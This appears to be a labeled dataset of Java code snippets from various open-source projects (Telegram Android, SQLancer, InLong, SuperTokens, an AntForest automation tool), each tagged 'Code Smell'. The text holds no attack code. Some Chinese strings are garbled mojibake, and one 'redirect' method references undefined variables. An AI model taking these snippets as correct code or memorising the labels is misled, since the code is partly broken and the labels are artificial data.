    int n=(int)Randomly.getNotCachedInteger(100,1000);
    for (int i=0; i < n; i++) {
      if (i != 0) {
        sb.append("", "");
      }
      sb.append(sbRowValue);
    }
  }
 else {
    int n=Randomly.smallNumber() + 1;
    for (int i=0; i < n; i++) {
      if (i != 0) {
        sb.append("", "");
      }
      insertRow(globalState,sb,columns,n == 1);
    }
  }
  if (Randomly.getBooleanWithRatherLowProbability()) {
    sb.append("" ON CONFLICT "");
    if (Randomly.getBoolean()) {
      sb.append(""("");
      sb.append(table.getRandomColumn().getName());
      sb.append("")"");
      errors.add(""there is no unique or exclusion constraint matching the ON CONFLICT specification"");
    }
    sb.append("" DO NOTHING"");
  }
  errors.add(""duplicate key value violates unique constraint"");
  errors.add(""identity column defined as GENERATED ALWAYS"");
  errors.add(""out of range"");
  errors.add(""violates check constraint"");
  errors.add(""no partition of relation"");
  errors.add(""invalid input syntax"");
  errors.add(""division by zero"");
  errors.add(""violates foreign key constraint"");
  errors.add(""data type unknown"");
  return new SQLQueryAdapter(sb.toString(),errors);
}",1,Code Smell
"@Override public PageResult<? extends StreamSink> listByCondition(SinkPageRequest request,String operator){
  Preconditions.expectNotBlank(request.getInlongGroupId(),ErrorCodeEnum.GROUP_ID_IS_EMPTY);
  PageHelper.startPage(request.getPageNum(),request.getPageSize());
  OrderFieldEnum.checkOrderField(request);
  OrderTypeEnum.checkOrderType(request);
  Page<StreamSinkEntity> entityPage=(Page<StreamSinkEntity>)sinkMapper.selectByCondition(request);
  Map<String,Page<StreamSinkEntity>> sinkMap=Maps.newHashMap();
  for (  StreamSinkEntity streamSink : entityPage) {
    InlongGroupEntity groupEntity=groupMapper.selectByGroupId(streamSink.getInlongGroupId());
    if (groupEntity == null) {
      continue;
    }
    sinkMap.computeIfAbsent(streamSink.getSinkType(),k -> new Page<>()).add(streamSink);
  }
  List<StreamSink> responseList=Lists.newArrayList();
  for (  Map.Entry<String,Page<StreamSinkEntity>> entry : sinkMap.entrySet()) {
    StreamSinkOperator sinkOperator=operatorFactory.getInstance(entry.getKey());
    PageResult<? extends StreamSink> pageInfo=sinkOperator.getPageInfo(entry.getValue());
    responseList.addAll(pageInfo.getList());
  }
  PageResult<StreamSink> pageResult=new PageResult<>(responseList,entityPage.getTotal(),entityPage.getPageNum(),entityPage.getPageSize());
  LOGGER.debug(""success to list sink page, result size {}"",pageResult.getList().size());
  return pageResult;
}
@Override public List<? extends StreamSink> listByCondition(SinkPageRequest request,UserInfo opInfo){
  if (StringUtils.isBlank(request.getInlongGroupId())) {
    throw new BusinessException(ErrorCodeEnum.GROUP_ID_IS_EMPTY);
  }
  OrderFieldEnum.checkOrderField(request);
  OrderTypeEnum.checkOrderType(request);
  List<StreamSinkEntity> sinkEntityList=sinkMapper.selectByCondition(request);
  Map<String,Page<StreamSinkEntity>> sinkMap=Maps.newHashMap();
  for (  StreamSinkEntity streamSink : sinkEntityList) {
    sinkMap.computeIfAbsent(streamSink.getSinkType(),k -> new Page<>()).add(streamSink);
  }
  List<StreamSink> filterResult=Lists.newArrayList();
  for (  Map.Entry<String,Page<StreamSinkEntity>> entry : sinkMap.entrySet()) {
    StreamSinkOperator sinkOperator=operatorFactory.getInstance(entry.getKey());
    PageResult<? extends StreamSink> pageInfo=sinkOperator.getPageInfo(entry.getValue());
    for (    StreamSink streamSink : pageInfo.getList()) {
      InlongGroupEntity groupEntity=groupMapper.selectByGroupId(streamSink.getInlongGroupId());
      if (groupEntity == null) {
        continue;
      }
      if (!opInfo.getAccountType().equals(TenantUserTypeEnum.TENANT_ADMIN.getCode())) {
        List<String> inCharges=Arrays.asList(groupEntity.getInCharges().split(InlongConstants.COMMA));
        if (!inCharges.contains(opInfo.getName())) {
          continue;
        }
      }
      filterResult.add(streamSink);
    }
  }
  return filterResult;
}
",1,Code Smell
"private boolean roundButtonTouchEvent(MotionEvent ev){
  if (ev.getAction() == MotionEvent.ACTION_DOWN) {
    if (stopRecording()) {
      return true;
    }
    recordTouch=true;
    if (getParent() != null) {
      getParent().requestDisallowInterceptTouchEvent(true);
    }
    if (!canRecord()) {
      return true;
    }
    AndroidUtilities.cancelRunOnUIThread(doneCancel);
    fromX=ev.getX();
    fromY=ev.getY();
    amplitude=0;
    slideProgress=0f;
    cancelT.set(0,true);
    cancel2T.set(0,true);
    cancelling=false;
    stopping=false;
    locked=false;
    recordPaint.reset();
    recording=true;
    startTime=System.currentTimeMillis();
    setCollapsed(true,Integer.MAX_VALUE);
    invalidateDrawOver2();
    putRecorder(currentRecorder=new RoundVideoRecorder(getContext()){
      @Override protected void receivedAmplitude(      double amplitude){
        setAmplitude(amplitude);
      }
      @Override public void stop(){
        super.stop();
        if (recording) {
          releaseRecord(true,false);
        }
      }
    }
);
    return true;
  }
 else   if (ev.getAction() == MotionEvent.ACTION_MOVE) {
    if (!cancelling) {
      slideProgress=Utilities.clamp((fromX - ev.getX()) / (getWidth() * .35f),1,0);
      lockProgress=Utilities.clamp((fromY - ev.getY()) / (getWidth() * .3f),1,0);
      if (!locked && !cancelling && slideProgress >= 1) {
        cancelling=true;
        recording=false;
        roundButton.setVisibility(INVISIBLE);
        periodButton.setVisibility(INVISIBLE);
        recordPaint.playDeleteAnimation();
        if (currentRecorder != null) {
          currentRecorder.cancel();
        }
        AndroidUtilities.runOnUIThread(doneCancel,800);
      }
 else       if (!locked && !cancelling && lockProgress >= 1 && slideProgress < .4f) {
        locked=true;
        try {
          performHapticFeedback(HapticFeedbackConstants.KEYBOARD_PRESS,HapticFeedbackConstants.FLAG_IGNORE_VIEW_SETTING);
        }
 catch (        Exception ignore) {
        }
      }
      invalidate();
      invalidateDrawOver2();
    }
  }
 else   if (ev.getAction() == MotionEvent.ACTION_UP || ev.getAction() == MotionEvent.ACTION_CANCEL) {
    if (!cancelling && !locked) {
      releaseRecord(false,false);
    }
    recordTouch=false;
  }
  return recordTouch;
}",1,Code Smell
"private static void redirect(ClassNode classNode,ClassLoaderRemapper remapper){
  for (  MethodNode methodNode : classNode.methods) {
    for (    AbstractInsnNode insnNode : methodNode.instructions) {
      if (insnNode instanceof MethodInsnNode) {
        if (from.getOpcode() == Opcodes.INVOKESPECIAL && Objects.equals(from.owner,classNode.superName) && Objects.equals(from.name,methodNode.name) && Objects.equals(from.desc,methodNode.desc)) {
          continue;
        }
        process(from,methodNode.instructions,remapper,classNode);
      }
 else       if (insnNode.getOpcode() == Opcodes.INVOKEDYNAMIC) {
        InvokeDynamicInsnNode invokeDynamic=(InvokeDynamicInsnNode)insnNode;
        Object[] bsmArgs=invokeDynamic.bsmArgs;
        for (int i=0; i < bsmArgs.length; i++) {
          Object bsmArg=bsmArgs[i];
          if (bsmArg instanceof Handle) {
            if (toOpcode(handle.getTag()) != -1) {
              bsmArgs[i]=processHandle(handle,remapper);
            }
          }
        }
      }
    }
  }
}
private static void redirect(Class<?> owner,String name,String handlerName,Class<?>... args){
  addRule(false,owner,name,handlerName,args);
}",1,Code Smell
"private void fixLayout(int viewWidth,int viewHeight){
  if (!ownLayout) {
    return;
  }
  viewWidth-=AndroidUtilities.dp(28);
  viewHeight-=AndroidUtilities.dp(14 + 140 + 60) + (Build.VERSION.SDK_INT >= 21 && !inBubbleMode ? AndroidUtilities.statusBarHeight : 0);
  float bitmapW;
  float bitmapH;
  if (bitmapToEdit != null) {
    if (orientation % 360 == 90 || orientation % 360 == 270) {
      bitmapW=bitmapToEdit.getHeight();
      bitmapH=bitmapToEdit.getWidth();
    }
 else {
      bitmapW=bitmapToEdit.getWidth();
      bitmapH=bitmapToEdit.getHeight();
    }
  }
 else {
    bitmapW=textureView.getWidth();
    bitmapH=textureView.getHeight();
  }
  float scaleX=viewWidth / bitmapW;
  float scaleY=viewHeight / bitmapH;
  if (scaleX > scaleY) {
    bitmapH=viewHeight;
    bitmapW=(int)Math.ceil(bitmapW * scaleY);
  }
 else {
    bitmapW=viewWidth;
    bitmapH=(int)Math.ceil(bitmapH * scaleX);
  }
  int bitmapX=(int)Math.ceil((viewWidth - bitmapW) / 2 + AndroidUtilities.dp(14));
  int bitmapY=(int)Math.ceil((viewHeight - bitmapH) / 2 + AndroidUtilities.dp(14) + (Build.VERSION.SDK_INT >= 21 && !inBubbleMode ? AndroidUtilities.statusBarHeight : 0));
  int width=(int)bitmapW;
  int height=(int)bitmapH;
  if (ownsTextureView) {
    LayoutParams layoutParams=(LayoutParams)textureView.getLayoutParams();
    layoutParams.leftMargin=bitmapX;
    layoutParams.topMargin=bitmapY;
    layoutParams.width=width;
    layoutParams.height=height;
  }
  curvesControl.setActualArea(bitmapX,bitmapY - (Build.VERSION.SDK_INT >= 21 && !inBubbleMode ? AndroidUtilities.statusBarHeight : 0),width,height);
  blurControl.setActualAreaSize(width,height);
  LayoutParams layoutParams;
  layoutParams=(LayoutParams)blurControl.getLayoutParams();
  layoutParams.height=viewHeight + AndroidUtilities.dp(38);
  layoutParams=(LayoutParams)curvesControl.getLayoutParams();
  layoutParams.height=viewHeight + AndroidUtilities.dp(28);
  if (AndroidUtilities.isTablet()) {
    int total=AndroidUtilities.dp(86) * 10;
    layoutParams=(FrameLayout.LayoutParams)recyclerListView.getLayoutParams();
    if (total < viewWidth) {
      layoutParams.width=total;
      layoutParams.leftMargin=(viewWidth - total) / 2;
    }
 else {
      layoutParams.width=LayoutHelper.MATCH_PARENT;
      layoutParams.leftMargin=0;
    }
  }
}",1,Code Smell
"public void updateSpeedItem(boolean visibleByPosition){
  if (speedItem == null) {
    return;
  }
  boolean visibleByDownload=false;
  for (  MessageObject obj : getDownloadController().downloadingFiles) {
    if (obj.getDocument() != null && obj.getDocument().size >= 150 * 1024 * 1024) {
      visibleByDownload=true;
      break;
    }
  }
  for (  MessageObject obj : getDownloadController().recentDownloadingFiles) {
    if (obj.getDocument() != null && obj.getDocument().size >= 150 * 1024 * 1024) {
      visibleByDownload=true;
      break;
    }
  }
  boolean visible=!getUserConfig().isPremium() && !getMessagesController().premiumFeaturesBlocked() && visibleByDownload&& visibleByPosition&& DISPLAY_SPEEDOMETER_IN_DOWNLOADS_SEARCH;
  boolean wasVisible=speedItem.getTag() != null;
  if (visible != wasVisible) {
    speedItem.setTag(visible ? true : null);
    speedItem.setClickable(visible);
    if (speedAnimator != null) {
      speedAnimator.cancel();
    }
    AnimatorSet animatorSet=new AnimatorSet();
    animatorSet.setDuration(180);
    animatorSet.playTogether(ObjectAnimator.ofFloat(speedItem,View.ALPHA,visible ? 1f : 0f),ObjectAnimator.ofFloat(speedItem,View.SCALE_X,visible ? 1f : 0.5f),ObjectAnimator.ofFloat(speedItem,View.SCALE_Y,visible ? 1f : 0.5f));
    animatorSet.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
          AnimatedVectorDrawable drawable=(AnimatedVectorDrawable)speedItem.getIconView().getDrawable();
          if (visible) {
            drawable.start();
            if (SharedConfig.getDevicePerformanceClass() != SharedConfig.PERFORMANCE_CLASS_LOW) {
              TLRPC.TL_help_premiumPromo premiumPromo=MediaDataController.getInstance(currentAccount).getPremiumPromo();
              String typeString=PremiumPreviewFragment.featureTypeToServerString(PremiumPreviewFragment.PREMIUM_FEATURE_DOWNLOAD_SPEED);
              if (premiumPromo != null) {
                int index=-1;
                for (int i=0; i < premiumPromo.video_sections.size(); i++) {
                  if (premiumPromo.video_sections.get(i).equals(typeString)) {
                    index=i;
                    break;
                  }
                }
                if (index != -1) {
                  FileLoader.getInstance(currentAccount).loadFile(premiumPromo.videos.get(index),premiumPromo,FileLoader.PRIORITY_HIGH,0);
                }
              }
            }
          }
 else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
              drawable.reset();
            }
 else {
              drawable.setVisible(false,true);
            }
          }
        }
      }
    }
);
    animatorSet.start();
    speedAnimator=animatorSet;
  }
}",1,Code Smell
"public static int getRunFlavor(){
  if (sRunFlavor != 0)   return sRunFlavor;
  final String flavorOverride=InstrumentationRegistry.getArguments().getString(""flavor"");
  if (flavorOverride != null) {
    Log.d(TAG,""Flavor override: "" + flavorOverride);
    try {
      return (int)TestStabilityRule.class.getField(flavorOverride).get(null);
    }
 catch (    NoSuchFieldException e) {
      throw new AssertionError(""Unrecognized run flavor override: "" + flavorOverride);
    }
catch (    IllegalAccessException e) {
      throw new RuntimeException(e);
    }
  }
  final String launcherVersion;
  try {
    final String launcherPackageName=UiDevice.getInstance(getInstrumentation()).getLauncherPackageName();
    Log.d(TAG,""Launcher package: "" + launcherPackageName);
    launcherVersion=getInstrumentation().getContext().getPackageManager().getPackageInfo(launcherPackageName,0).versionName;
  }
 catch (  PackageManager.NameNotFoundException e) {
    throw new RuntimeException(e);
  }
  final String platformVersion=Build.VERSION.INCREMENTAL;
  Log.d(TAG,""Launcher: "" + launcherVersion + "", platform: ""+ platformVersion);
  final Matcher launcherBuildMatcher=LAUNCHER_BUILD.matcher(launcherVersion);
  if (!launcherBuildMatcher.find()) {
    throw new AssertionError(""Launcher build match not found"");
  }
  final Matcher platformBuildMatcher=PLATFORM_BUILD.matcher(platformVersion);
  if (!platformBuildMatcher.find()) {
    throw new AssertionError(""Platform build match not found"");
  }
  if (launcherBuildMatcher.group(""local"") != null && (platformBuildMatcher.group(""commandLine"") != null || platformBuildMatcher.group(""postsubmit"") != null)) {
    Log.d(TAG,""LOCAL RUN"");
    sRunFlavor=LOCAL;
  }
 else   if (launcherBuildMatcher.group(""platform"") != null && platformBuildMatcher.group(""presubmit"") != null) {
    Log.d(TAG,""PLATFORM PRESUBMIT"");
    sRunFlavor=PLATFORM_PRESUBMIT;
  }
 else   if (launcherBuildMatcher.group(""platform"") != null && (platformBuildMatcher.group(""postsubmit"") != null || platformBuildMatcher.group(""commandLine"") != null)) {
    Log.d(TAG,""PLATFORM POSTSUBMIT"");
    sRunFlavor=PLATFORM_POSTSUBMIT;
  }
 else {
    throw new AssertionError(""Unrecognized run flavor"");
  }
  return sRunFlavor;
}",1,Code Smell
"private void runVideoPlayer(){
  if (file != null || SharedConfig.streamMedia) {
    if (videoPlayerBase != null) {
      return;
    }
    aspectRatioFrameLayout.setAspectRatio(aspectRatio,0);
    videoPlayerBase=new VideoPlayerHolderBase(){
      @Override public void onStateChanged(      boolean playWhenReady,      int playbackState){
        if (videoPlayerBase == null)         return;
        if (playbackState == ExoPlayer.STATE_ENDED) {
          videoPlayerBase.seekTo(0);
          videoPlayerBase.play();
        }
 else         if (playbackState == ExoPlayer.STATE_IDLE) {
          videoPlayerBase.play();
        }
      }
      @Override public void onRenderedFirstFrame(){
        if (textureView == null)         return;
        if (!VideoScreenPreview.this.firstFrameRendered) {
          textureView.setAlpha(0);
          textureView.animate().alpha(1f).setListener(new AnimatorListenerAdapter(){
            @Override public void onAnimationEnd(            Animator animation){
              VideoScreenPreview.this.firstFrameRendered=true;
              invalidate();
            }
          }
).setDuration(200);
        }
      }
    }
;
    videoPlayerBase.with(textureView);
    Uri uri;
    if (file != null && file.exists()) {
      uri=Uri.fromFile(file);
    }
 else {
      try {
        String params=""?account="" + currentAccount + ""&id=""+ document.id+ ""&hash=""+ document.access_hash+ ""&dc=""+ document.dc_id+ ""&size=""+ document.size+ ""&mime=""+ URLEncoder.encode(document.mime_type,""UTF-8"")+ ""&rid=""+ FileLoader.getInstance(currentAccount).getFileReference(MediaDataController.getInstance(currentAccount).getPremiumPromo())+ ""&name=""+ URLEncoder.encode(FileLoader.getDocumentFileName(document),""UTF-8"")+ ""&reference=""+ Utilities.bytesToHex(document.file_reference != null ? document.file_reference : new byte[0]);
        uri=Uri.parse(""tg://"" + attachFileName + params);
      }
 catch (      Exception exception) {
        uri=null;
      }
    }
    if (uri == null) {
      return;
    }
    videoPlayerBase.preparePlayer(uri,false,1f);
    if (!firstFrameRendered) {
      imageReceiver.stopAnimation();
      textureView.setAlpha(0);
    }
    videoPlayerBase.seekTo(lastFrameTime + 60);
    videoPlayerBase.play();
  }
}",1,Code Smell
"@Override public ProcessResult process(TaskContext context) throws Exception {
  log.info(""============== MapProcessorDemo#process =============="");
  log.info(""isRootTask:{}"",isRootTask());
  log.info(""taskContext:{}"",JsonUtils.toJSONString(context));
  log.info(""{}"",mysteryService.hasaki());
  if (isRootTask()) {
    log.info(""==== MAP ===="");
    List<SubTask> subTasks=Lists.newLinkedList();
    for (int j=0; j < BATCH_NUM; j++) {
      SubTask subTask=new SubTask();
      subTask.siteId=j;
      subTask.itemIds=Lists.newLinkedList();
      subTasks.add(subTask);
      for (int i=0; i < BATCH_SIZE; i++) {
        subTask.itemIds.add(i + j * 100);
      }
    }
    map(subTasks,""MAP_TEST_TASK"");
    return new ProcessResult(true,""map successfully"");
  }
 else {
    log.info(""==== PROCESS ===="");
    SubTask subTask=(SubTask)context.getSubTask();
    for (    Integer itemId : subTask.getItemIds()) {
      if (Thread.interrupted()) {
        log.info(""job has been stop! so stop to process subTask: {} => {}"",subTask.getSiteId(),itemId);
        break;
      }
      log.info(""processing subTask: {} => {}"",subTask.getSiteId(),itemId);
      int max=Integer.MAX_VALUE >> 7;
      for (int i=0; ; i++) {
        if (i > max) {
          break;
        }
      }
    }
    context.getWorkflowContext().appendData2WfContext(""Yasuo"",""A sword's poor company for a long road."");
    boolean b=ThreadLocalRandom.current().nextBoolean();
    if (context.getCurrentRetryTimes() >= 1) {
      b=true;
    }
    return new ProcessResult(b,""RESULT:"" + b);
  }
}",1,Code Smell
"public void start(final String appName,final String address){
  if (appName == null || appName.trim().length() == 0) {
    logger.warn("">>>>>>>>>>> web, executor registry config fail, appName is null."");
    return;
  }
  if (JobExecutor.getAdminBizList() == null) {
    logger.warn("">>>>>>>>>>> web, executor registry config fail, adminAddresses is null."");
    return;
  }
  registryThread=new Thread(() -> {
    while (!toStop) {
      try {
        RegistryParam registryParam=new RegistryParam(RegistryConfig.RegistType.EXECUTOR.name(),appName,address,OSUtils.cpuUsage(),OSUtils.memoryUsage(),OSUtils.loadAverage());
        for (        AdminBiz adminBiz : JobExecutor.getAdminBizList()) {
          try {
            ReturnT<String> registryResult=adminBiz.registry(registryParam);
            if (registryResult != null && ReturnT.SUCCESS_CODE == registryResult.getCode()) {
              registryResult=ReturnT.SUCCESS;
              logger.debug("">>>>>>>>>>> web registry success, registryParam:{}, registryResult:{}"",new Object[]{registryParam,registryResult});
              break;
            }
 else {
              logger.info("">>>>>>>>>>> web registry fail, registryParam:{}, registryResult:{}"",new Object[]{registryParam,registryResult});
            }
          }
 catch (          Exception e) {
            logger.info("">>>>>>>>>>> web registry error, registryParam:{}"",registryParam,e);
          }
        }
      }
 catch (      Exception e) {
        if (!toStop) {
          logger.error(e.getMessage(),e);
        }
      }
      try {
        if (!toStop) {
          TimeUnit.SECONDS.sleep(RegistryConfig.BEAT_TIMEOUT);
        }
      }
 catch (      InterruptedException e) {
        if (!toStop) {
          logger.warn("">>>>>>>>>>> web, executor registry thread interrupted, error msg:{}"",e.getMessage());
        }
      }
    }
    try {
      RegistryParam registryParam=new RegistryParam(RegistryConfig.RegistType.EXECUTOR.name(),appName,address);
      for (      AdminBiz adminBiz : JobExecutor.getAdminBizList()) {
        try {
          ReturnT<String> registryResult=adminBiz.registryRemove(registryParam);
          if (registryResult != null && ReturnT.SUCCESS_CODE == registryResult.getCode()) {
            registryResult=ReturnT.SUCCESS;
            logger.info("">>>>>>>>>>> web registry-remove success, registryParam:{}, registryResult:{}"",new Object[]{registryParam,registryResult});
            break;
          }
 else {
            logger.info("">>>>>>>>>>> web registry-remove fail, registryParam:{}, registryResult:{}"",new Object[]{registryParam,registryResult});
          }
        }
 catch (        Exception e) {
          if (!toStop) {
            logger.info("">>>>>>>>>>> web registry-remove error, registryParam:{}"",registryParam,e);
          }
        }
      }
    }
 catch (    Exception e) {
      if (!toStop) {
        logger.error(e.getMessage(),e);
      }
    }
    logger.info("">>>>>>>>>>> web, executor registry thread destory."");
  }
);
  registryThread.setDaemon(true);
  registryThread.setName(""web, executor ExecutorRegistryThread"");
  registryThread.start();
}",1,Code Smell
"@Override public boolean dispatchTouchEvent(MotionEvent ev){
  float iconX=backgroundView.getX() + backgroundView.imageFrameLayout.getX();
  float iconY=backgroundView.getY() + backgroundView.imageFrameLayout.getY();
  AndroidUtilities.rectTmp.set(iconX,iconY,iconX + (backgroundView.imageView == null ? 0 : backgroundView.imageView.getMeasuredWidth()),iconY + (backgroundView.imageView == null ? 0 : backgroundView.imageView.getMeasuredHeight()));
  if ((AndroidUtilities.rectTmp.contains(ev.getX(),ev.getY()) || iconInterceptedTouch) && !listView.scrollingByUser) {
    ev.offsetLocation(-iconX,-iconY);
    if (ev.getAction() == MotionEvent.ACTION_DOWN || ev.getAction() == MotionEvent.ACTION_MOVE) {
      iconInterceptedTouch=true;
    }
 else     if (ev.getAction() == MotionEvent.ACTION_UP || ev.getAction() == MotionEvent.ACTION_CANCEL) {
      iconInterceptedTouch=false;
    }
    backgroundView.imageView.dispatchTouchEvent(ev);
    return true;
  }
  float listX=backgroundView.getX() + backgroundView.tierListView.getX(), listY=backgroundView.getY() + backgroundView.tierListView.getY();
  AndroidUtilities.rectTmp.set(listX,listY,listX + backgroundView.tierListView.getWidth(),listY + backgroundView.tierListView.getHeight());
  if (progressToFull < 1.0f && (AndroidUtilities.rectTmp.contains(ev.getX(),ev.getY()) || listInterceptedTouch) && !listView.scrollingByUser) {
    ev.offsetLocation(-listX,-listY);
    if (ev.getAction() == MotionEvent.ACTION_DOWN) {
      listInterceptedTouch=true;
    }
 else     if (ev.getAction() == MotionEvent.ACTION_UP || ev.getAction() == MotionEvent.ACTION_CANCEL) {
      listInterceptedTouch=false;
    }
    backgroundView.tierListView.dispatchTouchEvent(ev);
    if (listInterceptedTouch) {
      return true;
    }
  }
  return super.dispatchTouchEvent(ev);
}
@Override public boolean dispatchTouchEvent(MotionEvent e){
  if (progressToFull >= 1.0f) {
    return false;
  }
  return super.dispatchTouchEvent(e);
}",1,Code Smell
"private AbstractRecordInterface findConfig(RecordAgentConfig recordTaskConfig,RecordWrapperEntity esRecordEntity){
  String entranceDesc=esRecordEntity.getEntranceDesc();
  String type=UriUtils.getUriType(entranceDesc);
  String path=UriUtils.getUriPath(entranceDesc);
  if (InvokeType.HTTP.getInvokeName().equalsIgnoreCase(type)) {
    for (    HttpRecordInterface httpRecordInterface : recordTaskConfig.getHttpRecordInterfaces()) {
      if (path.equalsIgnoreCase(httpRecordInterface.getUri())) {
        return httpRecordInterface;
      }
    }
  }
  if (InvokeType.DUBBO.getInvokeName().equalsIgnoreCase(type)) {
    for (    DubboRecordInterface dubboRecordInterface : recordTaskConfig.getDubboRecordInterfaces()) {
      String tmpPath=path.substring(0,path.indexOf(""(""));
      if (tmpPath.equals(dubboRecordInterface.getInterfaceName() + ""/"" + dubboRecordInterface.getMethodName())) {
        return dubboRecordInterface;
      }
    }
  }
  if (InvokeType.JAVA.getInvokeName().equals(type)) {
    for (    JavaRecordInterface jri : recordTaskConfig.getJavaRecordInterfaces()) {
      for (      String methodName : jri.getMethodPatterns()) {
        if (path.equals(jri.getClassPattern() + ""/"" + methodName+ ""()"")) {
          return jri;
        }
      }
    }
  }
  return null;
}",1,Code Smell
"@Override protected void onCreate(@Nullable Bundle savedInstanceState){
  setTheme(android.R.style.Theme_Translucent_NoTitleBar);
  super.onCreate(savedInstanceState);
  final Intent startIntent=getIntent();
  Bundle extras=startIntent.getExtras();
  if (extras == null) {
    finish();
    return;
  }
  final Intent targetIntent=extras.getParcelable(TARGET_INTENT);
  final String targetFilePath=extras.getString(TARGET_FILE_PATH);
  final String targetFileUri=extras.getString(TARGET_FILE_URI);
  String targetDisplayNameNullable=extras.getString(TARGET_FILE_ATTR_DISPLAY_NAME);
  final boolean useChooser=extras.getBoolean(TARGET_OPTION_USE_CHOOSER,false);
  if (targetIntent == null || TextUtils.isEmpty(targetFilePath) && TextUtils.isEmpty(targetFileUri)) {
    Log.e(""targetIntent or targetFilePath and targetFileUri is null"");
    finish();
    return;
  }
  Uri uri;
  IBinder binder=extras.getBinder(SHADOW_FILE_PROVIDER_BINDER);
  if (binder != null) {
    ShadowFileProvider.attachShadowTmpFileProviderBinder(binder);
  }
  if (TextUtils.isEmpty(targetFileUri)) {
    File targetFile=new File(targetFilePath);
    if (!targetFile.exists()) {
      Log.e(""targetFile not exists: "" + targetFilePath);
      Toast.makeText(this,""鏂囦欢涓嶅瓨鍦�"",Toast.LENGTH_SHORT).show();
      finish();
      return;
    }
    uri=FileProvider.getUriForFile(this,getPackageName() + "".fileprovider"",targetFile);
  }
 else {
    uri=Uri.parse(targetFileUri);
  }
  if (TextUtils.isEmpty(targetDisplayNameNullable)) {
    targetDisplayNameNullable=uri.getLastPathSegment();
  }
  targetIntent.setDataAndType(uri,targetIntent.getType());
  targetIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  targetIntent.putExtra(Intent.EXTRA_STREAM,uri);
  final Intent finalIntent;
  if (useChooser) {
    boolean hasNewActivityFlag=(targetIntent.getFlags() & Intent.FLAG_ACTIVITY_NEW_TASK) != 0;
    finalIntent=Intent.createChooser(targetIntent,targetDisplayNameNullable);
    if (hasNewActivityFlag) {
      startIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    }
  }
 else {
    finalIntent=targetIntent;
  }
  try {
    startActivity(finalIntent);
    finish();
  }
 catch (  ActivityNotFoundException e) {
    Log.e(""ShadowShareFileAgentActivity startActivity failed"",e);
    new AlertDialog.Builder(this).setTitle(Reflex.getShortClassName(e)).setMessage(e.getMessage()).setCancelable(true).setPositiveButton(android.R.string.ok,(dialog,which) -> finish()).setOnCancelListener(dialog -> finish()).setOnDismissListener(dialog -> finish()).show();
  }
}",1,Code Smell
"private static void exchangeEnergyDoubleClick(int count){
  int exchangedTimes=0;
  try {
    String s=AntForestRpcCall.itemList(""SC_ASSETS"");
    JSONObject jo=new JSONObject(s);
    String skuId=null;
    String spuId=null;
    double price=0d;
    if (jo.getBoolean(""success"")) {
      JSONArray itemInfoVOList=jo.optJSONArray(""itemInfoVOList"");
      if (itemInfoVOList != null && itemInfoVOList.length() > 0) {
        for (int i=0; i < itemInfoVOList.length(); i++) {
          jo=itemInfoVOList.getJSONObject(i);
          if (""鑳介噺鍙屽嚮鍗�"".equals(jo.getString(""spuName""))) {
            JSONArray skuModelList=jo.getJSONArray(""skuModelList"");
            for (int j=0; j < skuModelList.length(); j++) {
              jo=skuModelList.getJSONObject(j);
              if (""LIMIT_TIME_ENERGY_DOUBLE_CLICK_3DAYS_2023"".equals(jo.getString(""rightsConfigId""))) {
                skuId=jo.getString(""skuId"");
                spuId=jo.getString(""spuId"");
                price=jo.getJSONObject(""price"").getDouble(""amount"");
                break;
              }
            }
            break;
          }
        }
      }
      if (skuId != null) {
        for (int exchangeCount=1; exchangeCount <= count; exchangeCount++) {
          if (Statistics.canExchangeDoubleCardToday()) {
            jo=new JSONObject(AntForestRpcCall.queryVitalityStoreIndex());
            if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
              int totalVitalityAmount=jo.getJSONObject(""userVitalityInfoVO"").getInt(""totalVitalityAmount"");
              if (totalVitalityAmount > price) {
                jo=new JSONObject(AntForestRpcCall.exchangeBenefit(spuId,skuId));
                if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
                  Statistics.exchangeDoubleCardToday(true);
                  exchangedTimes=Statistics.getExchangeTimes();
                  Log.forest(""娲诲姏鍏戞崲馃帎[闄愭椂鍙屽嚮鍗#绗�"" + exchangedTimes + ""娆�"");
                }
 else {
                  Log.recordLog(jo.getString(""resultDesc""),jo.toString());
                  Statistics.exchangeDoubleCardToday(false);
                  break;
                }
                Thread.sleep(1000);
              }
 else {
                Log.recordLog(""娲诲姏鍊间笉瓒筹紝鍋滄鍏戞崲锛�"","""");
                break;
              }
            }
          }
 else {
            Log.recordLog(""鍏戞崲娆℃暟宸插埌涓婇檺锛�"","""");
            break;
          }
        }
      }
    }
 else {
      Log.recordLog(jo.getString(""desc""),s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""exchangeEnergyDoubleClick err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"@TestOnly public static void updateUsersEmailOrPassword(Main main,@Nonnull String userId,@Nullable String email,@Nullable String password) throws StorageQueryException, StorageTransactionLogicException, UnknownUserIdException, DuplicateEmailException, EmailChangeNotAllowedException {
  try {
    Storage storage=StorageLayer.getStorage(main);
    updateUsersEmailOrPassword(new AppIdentifier(null,null),storage,main,userId,email,password);
  }
 catch (  TenantOrAppNotFoundException e) {
    throw new IllegalStateException(e);
  }
}
public static void updateUsersEmailOrPassword(AppIdentifier appIdentifier,Storage storage,Main main,@Nonnull String userId,@Nullable String email,@Nullable String password) throws StorageQueryException, StorageTransactionLogicException, UnknownUserIdException, DuplicateEmailException, TenantOrAppNotFoundException, EmailChangeNotAllowedException {
  EmailPasswordSQLStorage epStorage=StorageUtils.getEmailPasswordStorage(storage);
  AuthRecipeSQLStorage authRecipeStorage=StorageUtils.getAuthRecipeStorage(storage);
  try {
    epStorage.startTransaction(transaction -> {
      try {
        AuthRecipeUserInfo user=authRecipeStorage.getPrimaryUserById_Transaction(appIdentifier,transaction,userId);
        if (user == null) {
          throw new StorageTransactionLogicException(new UnknownUserIdException());
        }
        boolean foundEmailPasswordLoginMethod=false;
        for (        LoginMethod lm : user.loginMethods) {
          if (lm.recipeId == RECIPE_ID.EMAIL_PASSWORD && lm.getSupertokensUserId().equals(userId)) {
            foundEmailPasswordLoginMethod=true;
            break;
          }
        }
        if (!foundEmailPasswordLoginMethod) {
          throw new StorageTransactionLogicException(new UnknownUserIdException());
        }
        if (email != null) {
          if (user.isPrimaryUser) {
